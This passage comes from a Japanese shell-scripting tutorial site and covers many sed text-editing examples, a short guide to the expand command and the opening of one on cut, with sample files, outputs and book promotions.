実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/OS/ d\u0026#39; Windows Linux Android bash-5.1$ ヒント d オプションは、delete（削除）です。 一致する行の後の2行を削除 次のコマンドは、パターン「Linux」が見つかった場合、ファイルos.txtから3行を削除します。os.txtには、2行目に「Linux 」というテキストが含まれています。したがって、この行と次の2行は削除されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt | sed \u0026#39;/Linux/,+2d\u0026#39; Windows テキスト行の最後にあるすべてのスペースを削除 [:blank:]クラス（といいます）を使用すると、テキストまたは任意のファイルのコンテンツからスペースとタブを削除できます。次のコマンドは、ファイルos.txt の各行の終わりにあるスペースを削除します。\n以下のテキストの行末には半角スペースが３つづつついています。（みえないけど）\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_space.txt Windows Linux Android OS $ $ cat os_space.txt | sed \u0026#39;/^[[:blank:]]*$/d\u0026#39; Windows Linux Android OS 出力されたテキストには、半角スペースが除去されています（みえないけど）\n行で2回一致するすべての行を削除 次の内容のinput.txtという名前のテキストファイルを作成し、検索パターンを含むファイルの行を2回削除します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. input.txtファイルには一行に「PHP」というワードが２回表示される行が２行あります。\n以下の例では、sedコマンドの -e オプションを使って、sedコマンドを連続して使用し、パターン\u0026rsquo;PHP\u0026rsquo;を含む２行を削除します。\n最初のsedコマンドは、各行の2番目に出現する\u0026rsquo;PHP\u0026rsquo;を\u0026rsquo;dl\u0026rsquo;に置き換え、次のsedコマンド「-e」で、テキスト\u0026rsquo; dl \u0026lsquo;を含む行を「dオプション」で削除します。\n実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -e \u0026#39;s/php/dl/i2;\u0026#39; -e \u0026#39;/dl/d\u0026#39; PHP is a server-side scripting language. PHP is platform-independent. 空行を削除 この例をテストするには、コンテンツに空の行が含まれているファイルを選択します。前の例で作成されたinput.txtファイルには、次のsedコマンドを使用して削除できる2つの空の行が含まれています。ここで、「^$」は、ファイルinput.txtの空の行を見つけるために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os_blank.txt Windows Linux Android OS $ cat os_blank.txt | sed \u0026#39;/^$/d\u0026#39; Windows Linux Android OS ヒント ^$ は 行頭（^)と行末（$)の間になにもない（空行）という意味になります。ものすごく良く使います。 印刷できない文字をすべて削除 印刷できない文字をnoneに置き換えることにより、印刷できない文字を任意のテキストから削除できます。\nこの例では、[:print:]クラスを使用して、印刷できない文字を検索します。\u0026rsquo;\\ t\u0026rsquo;は印刷できない文字なので、echoコマンドで直接解析することはできません。\n以下のコマンドを実行すると、「echo」コマンドで使用される変数$tabに「\\t」文字が混入しても、sedコマンドで[:print:]に該当する文字\u0026rsquo;\\t\u0026rsquo;が削除されます。\n実行結果は以下のとおりです。\n$ tab=$\u0026#39;\\t\u0026#39; $ echo Hello\u0026#34;$tab\u0026#34;World Hello\tWorld $ echo Hello\u0026#34;$tab\u0026#34;World | sed \u0026#39;s/[^[:print:]]//g\u0026#39; HelloWorld $ ヒント 上記のコマンドを実行すると、次の出力が表示されます。最初のechoコマンドはTAB付きで出力し、sedコマンドの[^[:print:]]出力できない文字であるタブスペースを削除し出力します。 一致した場合行末に文字列を追加 次のsedコマンドは、 os.txtファイルのテキスト「Windows」を含む行の最後に「10」を追加します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Windows/ s/$/ 10/\u0026#39; Windows 10 Linux Android OS 一致した場合行前に行を挿入 次のsedコマンドは、前に作成されたinput.txtファイルの「PHP is platform-independent」というテキストを検索します。ファイルのいずれかの行にこのテキストが含まれている場合、「PHP is an interpreted language」がその行の前に挿入されます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\ncat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat input.txt | sed \u0026#39;/PHP is platform-independent/ s/^/PHP is an interpreted language.\\n/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is an interpreted language. PHP is platform-independent. 一致したら一致行の下に文字列を挿入 次のsedコマンドは、ファイルos.txt内のテキスト\u0026rsquo; Linux\u0026rsquo;を検索し、テキストがいずれかの行に存在する場合は、新しいテキスト\u0026rsquo; Ubuntu \u0026lsquo;がその行の後に挿入されます。\nWindows Linux Android OS 実行結果は以下のとおりです\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/\u0026amp;\\nUbuntu/\u0026#39; Windows Linux Ubuntu Android OS $ ヒント \u0026amp;\\n が自分自身の行のあとに改行という意味になります。 一致しない場合は行末に文字列を追加 次のsedコマンドは、os.txt内でテキスト「Linux」を含まない行を検索し、各行の最後にテキスト「Operating System」を追加します。ここで、「$」記号は、新しいテキストが追加される行を識別するために使用されます。\nWindows Linux Android OS $ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/Linux/! s/$/ Operating System/\u0026#39; Windows Operating System Linux Android Operating System OS Operating System ヒント /Linux/! で、Linuxという文字列が行になければという意味、$は行末を意味します。Operation Systemの戦闘に空白が有るのがミソです。 一致しない行を削除 web.txtという名前のファイルを作成し、次のコンテンツを追加して、一致するパターンを含まない行を削除します。\nHTML5 JavaScript CSS PHP MySQL JQuery 次のsedコマンドは、テキスト「CSS」を含まない行を検索して削除します。\n実行結果は以下のとおりです。\n$ cat web.txt HTML5 JavaScript CSS PHP MySQL JQuery $ $ cat web.txt | sed \u0026#39;/CSS/!d\u0026#39; CSS 上記のコマンドを実行すると、次の出力が表示されます。\u0026lsquo;CSS\u0026rsquo;というテキストを含むファイルに1行あります。したがってCSSを含む1行だけが出力され、CSSを含まない行は削除されます。\nテキストの後にスペースを追加した後、一致したテキストを複製する 次のsedコマンドは、ファイルpython.txt内の\u0026rsquo;to\u0026rsquo;という単語を検索します。その単語が存在する場合は、スペースを追加して、同じ単語が検索単語の後に挿入されます。ここでは、「\u0026amp;」記号を使用して重複テキストを追加しています。\nPython is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ cat python.txt Python is a very popular language. Python is easy to use. Python is easy to learn. Python is a cross-platform language $ $ cat python.txt | sed -e \u0026#39;s/to /\u0026amp; to/g\u0026#39; Python is a very popular language. Python is easy to touse. Python is easy to tolearn. Python is a cross-platform language $ ヒント 意味のないサンプルとなりましたが、このコマンドを実行すると、「to」という単語がファイルpython.txtで検索され、この単語はこのファイルの2行目に存在することがわかります。結果、一致するテキストの後にスペースを含む「to 」が追加されます。 文字列のリストの1つを新しい文字列に置き換える この例をテストするには、2つのリストファイルを作成する必要があります。\n1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 次のsedコマンドは、上記の2つのテキストファイルの最初の列と一致し、一致するテキストをファイルlist1.txtの3番目の列の値に置き換えます。\n実行結果は以下のとおりです。\n$ cat list1.txt 1001 =\u0026gt; Jafar Ali 1023 =\u0026gt; Nir Hossain 1067 =\u0026gt; John Michel $ $ cat list2.txt 1001 CSE GPA-3.63 1002 CSE GPA-3.24 1023 CSE GPA-3.11 1067 CSE GPA-3.84 $ $ sed `cat list1.txt | awk \u0026#39;{print \u0026#34;-e s/\u0026#34;$1\u0026#34;/\u0026#34;$3\u0026#34;/\u0026#34;}\u0026#39;`\u0026lt;\u0026lt;\u0026lt;\u0026#34;` cat list2.txt`\u0026#34; Jafar CSE GPA-3.63 1002 CSE GPA-3.24 Nir CSE GPA-3.11 John CSE GPA-3.84 ヒント list1.txtファイルの1001、1023、1067は、list2.txtファイルの3つのデータと一致し、これらの値は、list1.txtの3番目の列の対応する名前に置き換えられます。 一致した文字列を改行を含む文字列に置き換える 次のコマンドは、 echoコマンドから入力を受け取り、テキスト内の「Python」という単語を検索します。単語がテキストに存在する場合、新しいテキスト「Added Text」が改行で挿入されます。\n$ echo \u0026#34;Bash Perl Python Java PHP ASP\u0026#34; | sed \u0026#39;s/Python/Added Text\\n/\u0026#39; Bash Perl Added Text Java PHP ASP ファイルから改行を削除し各行の最後にコンマを挿入 次のsedコマンドは、ファイルos.txtの各改行をコンマに置き換えます。ここで、-zオプションは、行をNULL文字で区切るために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed -z \u0026#39;s/\\n/,/g\u0026#39; Windows,Linux,Android,OS,$ カンマを削除し、改行を追加して、テキストを複数の行に分割 次のsedコマンドは、echoコマンドからコンマで区切られた行を入力として受け取り、コンマを改行に置き換えます。\n$ echo \u0026#34;Kaniz Fatema,30th,batch\u0026#34; | sed \u0026#34;s/,/\\n/g\u0026#34; Kaniz Fatema 30th batch ヒント 上記のコマンドを実行すると、入力テキストのカンマは改行に置き換えられ3行で印刷されます。 大文字と小文字を区別しない一致を検索し、行を削除 次のsedコマンド\u0026rsquo;I\u0026rsquo;は、大文字と小文字を区別しないオプションです。一致で大文字と小文字を無視することを示します。\n次のsedコマンドは、「linux」という単語を大文字小文字を区別せずに検索し、 os.txtファイルからその行を削除します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;/linux/Id\u0026#39; Windows Android OS 大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える 次のsedコマンドは、echoコマンドからの入力を受け取り、単語\u0026rsquo;bash\u0026rsquo;を単語\u0026rsquo;PHP\u0026rsquo;に置き換えます。\n「Bash」という単語は、大文字と小文字を区別しない検索のために「bash」という単語と一致し、「PHP」という単語に置き換えられています。\n$ echo \u0026#34;I like bash programming \u0026#34; | sed \u0026#39;s/Bash/PHP/i\u0026#39; I like PHP programming 大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える \u0026lsquo;\\U\u0026rsquo;は、テキストをすべて大文字に変換します。次のsedコマンドは、 os.txtファイル内の単語\u0026rsquo;linux\u0026rsquo;を大文字小文字を区別せずに検索し、単語が存在する場合は、単語をすべて大文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\U\\1/Ig\u0026#39; Windows LINUX Android OS 大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える \u0026lsquo;\\L\u0026rsquo;はsedで使用され、テキストをすべて小文字に変換します。次のsedコマンドは、os.txtファイルの「Linux」という単語を検索し、その単語をすべて小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ cat os.txt | sed \u0026#39;s/\\(linux\\)/\\L\\1/Ig\u0026#39; Windows linux Android OS テキスト内のすべての大文字を小文字に置き換える 次のsedコマンドは、os.txtファイル内のすべての大文字を検索し、「\\L」を使用して文字を小文字に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/\\(.*\\)/\\L\\1/\u0026#39; windows linux android os 行の番号を検索し、番号の後に通貨記号を追加 以下のファイルを準備します。\nHDD 100 Monitor 80 Mouse 10 実行結果は以下の通りです。\n$ cat items.txt HDD 100 Monitor 80 Mouse 10 $ $ cat items.txt | sed \u0026#39;s/\\([0-9]\\)/$\\1/\u0026#39; HDD $100 Monitor $80 Mouse $10 上記のコマンドを実行すると、次の出力が表示されます。ここでは、各行の番号の前に「$」記号が追加されています。\n3桁を超える数値にコンマを追加 次のsedコマンドは、 echoコマンドからの入力として数値を受け取り、右から数えて3桁の各グループの後にコンマを追加します。ここで、「：a」はラベルを示し、「ta」はグループ化プロセスを繰り返すために使用されます。\n$ echo \u0026#34;5098673\u0026#34; | sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; 5,098,673 ヒント ようするに桁区切りをsedコマンドで実現するということです。 タブ文字を4つのスペース文字に置き換えます 次のsedコマンドは、各タブ（\\ t）文字を4つのスペース文字に置き換えます。「$」記号は「sed」コマンドでタブ文字と一致するように使用され、「g」はすべてのタブ文字を置き換えるために使用されます。\n実行結果は以下のとおりです。\\tという文字列が\n$ echo -e \u0026#34;1\\t2\\t3\u0026#34; | sed $\u0026#39;s/\\t/ /g\u0026#39; 1 2 3 4つの連続するスペース文字をタブ文字に置き換えます 次のコマンドは、4つの連続する文字をタブ（\\ t）文字に置き換えます。\n$ echo -e \u0026#34;1 2\u0026#34; | sed $\u0026#39;s/ /\\t/g\u0026#39; 1\t2 すべての行を最初の80文字に切り捨てます この例をテストするには、80文字を超える行を含むin.txtという名前のテキストファイルを作成します。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ cat in.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-independent. $ $ cat in.txt | sed \u0026#39;s/\\(^.\\{1,80\\}\\).*/\\1/\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive.PHP is platform-indepen ヒント 上記のコマンドを実行すると、次の出力が表示されます。in.txtファイルの2行目には、80文字を超える文字が含まれており、この行は出力で切り捨てられます。 文字列の正規表現を検索し、その後に標準テキストを追加 次のsedコマンドは、入力テキスト内のテキスト\u0026rsquo; hello \u0026lsquo;を検索し、そのテキストの後にテキスト\u0026rsquo; John \u0026lsquo;を追加します。\n実行結果は以下のとおりです。\n$ echo \u0026#34;hello, how are you?\u0026#34; | sed \u0026#39;s/\\(hello\\)/\\1 John/\u0026#39; hello John, how are you? 文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します 次のsedコマンドは、 input.txtの各行のテキスト「 PHP 」を検索し、各行の2番目の一致をテキスト「NewTextAdded」に置き換えます。\nPHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat input.txt | sed \u0026#39;s/\\(PHP\\)/\\1 (New Text added)/2\u0026#39; PHP is a server-side scripting language. PHP is an open-source language and PHP (New Text added) is case-sensitive. PHP is platform-independent. ヒント 上記のコマンドを実行すると、次の出力が表示されます。検索テキスト「PHP 」は、 input.txtファイルの2行目と3行目に2回表示されます。そのため、2行目と3行目に「NewTextadded」というテキストが挿入されます。 ファイルからの複数行のsedスクリプトの実行 複数のsedスクリプトをファイルに保存し、sedコマンドを実行することですべてのスクリプトを一緒に実行できます。\u0026lsquo;sedcmd \u0026lsquo;という名前のファイルを作成し、次のコンテンツを追加します。ここでは、2つのsedスクリプトがファイルに追加されています。1つのスクリプトがテキスト「PHP」を「ASP」に置き換えます。別のスクリプトがテキスト「独立」をテキスト「依存」に置き換えます。\ns/PHP/ASP/ s/independent/dependent/ PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. 実行結果は以下のとおりです。\n$ cat sedcmd s/PHP/ASP/ s/independent/dependent/ $ $ cat input.txt PHP is a server-side scripting language. PHP is an open-source language and PHP is case-sensitive. PHP is platform-independent. $ $ cat input.txt | sed -f sedcmd ASP is a server-side scripting language. ASP is an open-source language and PHP is case-sensitive. ASP is platform-dependent. ヒント 同様の検索ルールを別ファイルにしておくことで、何度も同じルールを書くことをしなくてすみます。必要なときにファイルを読み出せばよいわけです。 複数行のパターンに一致し、新しい複数行のテキストに置き換える 次のsedコマンドは、複数行のテキスト\u0026rsquo;Linux \\ nAndroid\u0026rsquo;を検索し、パターンが一致する場合、一致する行は複数行のテキスト\u0026rsquo; Ubuntu \\nAndroidLollipop\u0026rsquo;に置き換えられます。ここで、PとDはマルチライン処理に使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;$!N;s/Linux\\nAndroid/Ubuntu\\nAndoid Lollipop/;P;D\u0026#39; Windows Ubuntu Andoid Lollipop OS ヒント わけがわかりませんね。http://blog.livedoor.jp/morituri/archives/52036613.html　こちらを参考に。検索文字列は「sed Nコマンド」です。 パターンに一致する2つの単語の順序を置き換えます 次のsedコマンドは、 echoコマンドから2つの単語の入力を受け取り、これらの単語の順序を置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;perl python\u0026#34; | sed -e \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; python perl コマンドラインから複数のsedコマンドを使用する \u0026lsquo;-e\u0026rsquo;オプションは、コマンドラインから複数のsedスクリプトを実行するためにsedコマンドで使用されます。次のsedコマンドは、 echoコマンドからの入力としてテキストを受け取り、「Ubuntu」を「Kubuntu」に、「Centos」を「Fedora」に置き換えます。\n実行結果は以下のとおりです。\n$ echo \u0026#34;Ubuntu Centos Debian\u0026#34; | sed -e \u0026#39;s/Ubuntu/Kubuntu/; s/Centos/Fedora/\u0026#39; Kubuntu Fedora Debian sedを他のコマンドと組み合わせる 次のコマンドは、sedコマンドとcatコマンドを組み合わせたものです。最初のsedコマンドはos.txtファイルから入力を受け取り、テキスト\u0026rsquo;\u0026lsquo;Linux\u0026rsquo;を\u0026rsquo;Fedora\u0026rsquo;に置き換えた後、コマンドの出力を2番目のsedコマンドに送信します。2番目のsedコマンドは、テキスト「Windows」を「Windows10」に置き換えます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed \u0026#39;s/Linux/Fedora/\u0026#39;| sed \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS ヒント sedの連結は以下のように書くことができます。 $ cat os.txt | sed -e \u0026#39;s/Linux/Fedora/\u0026#39; -e \u0026#39;s/windows/Windows 10/i\u0026#39; Windows 10 Fedora Android OS bash-5.1$ ヒント sed -e と書くことで、パイプで渡すことなく、sedコマンドを連続して使うことができます。 ファイルに空の行を挿入 次の内容のstdlist.txtを作成します。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 「G」オプションは、ファイルに空の行を挿入するために使用されます。次のsedコマンドは、 stdlistファイルの各行の後に空の行を挿入します。\n実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ sed G stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha ヒント 一見、使われそうなGオプションですが、使うシチュエーションに出会ったことがありません。 ファイルの各行からすべての英数字を削除 次のコマンドは、 stdlistファイル内のすべての英数字をスペースに置き換えます。\n#ID #Name [ 101 ] -Ali [ 102 ] -Neha 実行結果は以下のとおりです。\n$ cat stdlist.txt #ID #Name [ 101 ] -Ali [ 102 ] -Neha $ $ cat stdlist.txt | sed \u0026#39;s/[A-Za-z0-9]//g\u0026#39; # # [ ] - [ ] - $ 「\u0026amp;」を使用して文字列と一致させる 次のコマンドは、「L」で始まる単語を検索し、「Matched String is –」を「\u0026amp;」記号を使用して一致した単語に追加することでテキストを置き換えます。ここで、「p」は変更されたテキストを印刷するために使用されます。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt | sed -n \u0026#39;s/^L/Matched String is - \u0026amp;/p\u0026#39; Matched String is - Linux 単語のペアを切り替える 各行に単語のペアを含む次のコンテンツを含むcourse.txtという名前のテキストファイルを作成します。\nPHP ASP MySQL Oracle CodeIgniter Laravel 実行結果は以下のとおりです。\n$ cat course.txt PHP ASP MySQL Oracle CodeIgniter Laravel $ $ cat course.txt | sed \u0026#39;s/\\([^ ]*\\) *\\([^ ]*\\)/\\2 \\1/\u0026#39; ASP PHP Oracle MySQL Laravel CodeIgniter $ 各単語の最初の文字を大文字に変換する 次のsedコマンドは、 echoコマンドから入力テキストを受け取り、各単語の最初の文字を大文字に変換します。\n$ echo \u0026#34;I like bash programming\u0026#34; | sed \u0026#39;s/\\([a-z]\\)\\([a-zA-Z0-9]*\\)/\\u\\1\\2/g\u0026#39; I Like Bash Programming ヒント ここまでくると、カルト級ですね。使いこなせる人がいればほぼ神業ですね。 ファイルの行番号を印刷する \u0026lsquo;=\u0026lsquo;記号は、ファイルの各行の前に行番号を出力するためにsedコマンドで使用されます。次のコマンドは、os.txtファイルの内容を行番号とともに出力します。\nWindows Linux Android OS 実行結果は以下のとおりです。\n$ cat os.txt Windows Linux Android OS $ $ cat os.txt |sed \u0026#39;=\u0026#39; 1 Windows 2 Linux 3 Android 4 OS ヒント できれば行頭に行番号が来てほしいですね。工夫して頑張って作ってみてください。 $ cat os.txt | sed \u0026#39;=\u0026#39; | sed \u0026#39;N;s/\\n/ /\u0026#39; ヒント 楽しめましたか？では 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T15:00:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-sed-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-sed-suzuki/","title":"（１８）【sed】シェルスクリプトコマンド活用紹介"},{"content":"expandコマンド タブを空白に変換する（expandコマンド） タブの幅を指定する expandコマンド概要 「expand」はタブを空白に変換するコマンド、「unexpand」は空白をタブに変換するコマンドです。デフォルトのタブ幅は8桁で、これを変更したい場合は「-t」オプションでタブの文字数を指定します。\nexpandコマンドの書式 expand [オプション] [ファイル]\nunexpand [オプション] [ファイル]\nexpandコマンドの主なオプション オプション 意味 -t 文字数 タブの文字数またはタブ位置のリストを指定する expandコマンド詳細説明 タブを空白に変換する まずサンプルファイルを用意します。\n$ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 expandコマンドでタブを空白に変換します。\n$ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 見た目は全く変わりませんが、タブが空白に置き換えられました。\nデフォルトのタブ幅は８です。\nタブの幅を指定する タブ幅を変更する場合は、「-t」オプションを使用します。例えば、12文字の幅にしたい場合は「-t 12」と指定します。\n# サンプルファイルを作成 $ echo -e \u0026#34;No-1\\tTokyo\\t1354098\\nNo-2\\tOsaka\\t934765\\nNo-3\\tNagoya\\t786592\u0026#34; \u0026gt; ex.txt $ cat ex.txt No-1\tTokyo\t1354098 No-2\tOsaka\t934765 No-3\tNagoya\t786592 # タブ幅のデフォルトは8です。 $ expand ex.txt \u0026gt; ex2.txt $ cat ex2.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 # タブ幅を10に指定 $ expand -t 10 ex.txt \u0026gt;ex3.txt $ cat ex3.txt No-1 Tokyo 1354098 No-2 Osaka 934765 No-3 Nagoya 786592 ヒント タブ幅を変更する場合には、$ expand -t 10 と、覚えておけば良いと思います。 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-07-14T13:19:26+09:00","image":"https://suzukiiichiro.github.io/posts/2022-07-14-01-expand-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-07-14-01-expand-suzuki/","title":"（１７）【expand】シェルスクリプトコマンド活用紹介"},{"content":"cutコマンド 文字数を指定して切り出す フィールドを指定して切り出す 出力の区切り文字を変更する cutコマンド概要 「cut」は、ファイルを読み込んで、それぞれの行から指定した部分だけを切り出すコマンドです。例えば、「3文字目から10文字目」や、タブなどで区切られたファイルから「1番目のフィールドと3番目のフィールド」のように選んで取り出すことができます。\ncutコマンドの書式 cut オプション [ファイル]\ncutコマンドの主なオプション オプション 意味 -c 